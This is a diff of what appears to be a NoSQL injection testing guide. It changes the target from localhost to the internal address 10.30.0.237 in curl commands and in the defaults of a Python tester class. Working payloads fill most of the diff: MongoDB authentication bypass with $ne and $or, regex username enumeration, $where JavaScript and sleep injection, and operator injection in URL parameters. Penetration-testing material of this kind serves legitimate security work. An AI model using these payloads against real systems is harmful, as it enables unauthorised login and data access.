@@ -29,17 +29,17 @@ git clone https://github.com/cr0hn/nosqlinjection_wordlists.git ~/nosql-wordlist
 
 ```bash
 # Basic NoSQL injection - authentication bypass
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
 
 # OR operator injection
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email": {"$or": [{"email": "admin"}, {"email": "user"}]}, "password": {"$ne": null}}'
 
 # Regex injection for username enumeration
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email": {"$regex": "^admin.*"}, "password": {"$ne": null}}'
 ```
@@ -48,30 +48,30 @@ curl -X POST "http://localhost:3000/rest/user/login" \
 
 ```bash
 # URL parameter NoSQL injection
-curl "http://localhost:3000/api/users?id[\$ne]=null"
-curl "http://localhost:3000/api/users?username[\$regex]=^admin"
-curl "http://localhost:3000/api/products?category[\$nin][]=electronics&category[\$nin][]=books"
+curl "http://10.30.0.237:3000/api/users?id[\$ne]=null"
+curl "http://10.30.0.237:3000/api/users?username[\$regex]=^admin"
+curl "http://10.30.0.237:3000/api/products?category[\$nin][]=electronics&category[\$nin][]=books"
 
 # Array injection
-curl "http://localhost:3000/api/search?filters[\$where]=this.price < 100"
-curl "http://localhost:3000/api/search?filters[\$exists]=true"
+curl "http://10.30.0.237:3000/api/search?filters[\$where]=this.price < 100"
+curl "http://10.30.0.237:3000/api/search?filters[\$exists]=true"
 ```
 
 ### 3. JavaScript Injection (MongoDB)
 
 ```bash
 # Where clause injection
-curl -X POST "http://localhost:3000/api/search" \
+curl -X POST "http://10.30.0.237:3000/api/search" \
   -H "Content-Type: application/json" \
   -d '{"query": {"$where": "this.username == \"admin\" || \"1\" == \"1\""}}'
 
 # Function injection
-curl -X POST "http://localhost:3000/api/search" \
+curl -X POST "http://10.30.0.237:3000/api/search" \
   -H "Content-Type: application/json" \
   -d '{"query": {"$where": "function() { return this.username == \"admin\" || true; }"}}'
 
 # Sleep injection for time-based testing
-curl -X POST "http://localhost:3000/api/search" \
+curl -X POST "http://10.30.0.237:3000/api/search" \
   -H "Content-Type: application/json" \
   -d '{"query": {"$where": "sleep(5000) || true"}}'
 ```
@@ -80,19 +80,19 @@ curl -X POST "http://localhost:3000/api/search" \
 
 ```bash
 # $gt (greater than) operator
-curl "http://localhost:3000/api/products?price[\$gt]=0"
+curl "http://10.30.0.237:3000/api/products?price[\$gt]=0"
 
 # $lt (less than) operator
-curl "http://localhost:3000/api/products?price[\$lt]=9999"
+curl "http://10.30.0.237:3000/api/products?price[\$lt]=9999"
 
 # $in operator with array
-curl "http://localhost:3000/api/users?role[\$in][]=admin&role[\$in][]=user"
+curl "http://10.30.0.237:3000/api/users?role[\$in][]=admin&role[\$in][]=user"
 
 # $all operator
-curl "http://localhost:3000/api/products?tags[\$all][]=electronics&tags[\$all][]=featured"
+curl "http://10.30.0.237:3000/api/products?tags[\$all][]=electronics&tags[\$all][]=featured"
 
 # $size operator
-curl "http://localhost:3000/api/products?reviews[\$size]=5"
+curl "http://10.30.0.237:3000/api/products?reviews[\$size]=5"
 ```
 
 ## Automated Python Script
@@ -133,7 +133,7 @@ class NoSQLInjectionTester:
         )
         self.logger = logging.getLogger(__name__)
 
-    def test_mongodb_authentication_bypass(self, base_url="http://localhost:3000"):
+    def test_mongodb_authentication_bypass(self, base_url="http://10.30.0.237:3000"):
         """Test MongoDB authentication bypass vulnerabilities"""
         self.logger.info("Testing MongoDB authentication bypass")
 
@@ -173,7 +173,7 @@ class NoSQLInjectionTester:
             except Exception as e:
                 self.logger.error(f"Error testing auth bypass: {e}")
 
-    def test_query_parameter_injection(self, base_url="http://localhost:3000"):
+    def test_query_parameter_injection(self, base_url="http://10.30.0.237:3000"):
         """Test NoSQL injection in URL parameters"""
         self.logger.info("Testing NoSQL query parameter injection")
 
@@ -225,7 +225,7 @@ class NoSQLInjectionTester:
                 except Exception as e:
                     self.logger.error(f"Error testing query injection: {e}")
 
-    def test_javascript_injection(self, base_url="http://localhost:3000"):
+    def test_javascript_injection(self, base_url="http://10.30.0.237:3000"):
         """Test JavaScript injection in NoSQL where clauses"""
         self.logger.info("Testing JavaScript injection in NoSQL queries")
 
@@ -281,7 +281,7 @@ class NoSQLInjectionTester:
             except Exception as e:
                 self.logger.error(f"Error testing JavaScript injection: {e}")
 
-    def test_blind_nosql_injection(self, base_url="http://localhost:3000"):
+    def test_blind_nosql_injection(self, base_url="http://10.30.0.237:3000"):
         """Test blind NoSQL injection techniques"""
         self.logger.info("Testing blind NoSQL injection")
 
@@ -325,7 +325,7 @@ class NoSQLInjectionTester:
                 except Exception as e:
                     self.logger.error(f"Error in blind injection test: {e}")
 
-    def test_time_based_nosql_injection(self, base_url="http://localhost:3000"):
+    def test_time_based_nosql_injection(self, base_url="http://10.30.0.237:3000"):
         """Test time-based blind NoSQL injection"""
         self.logger.info("Testing time-based NoSQL injection")
 
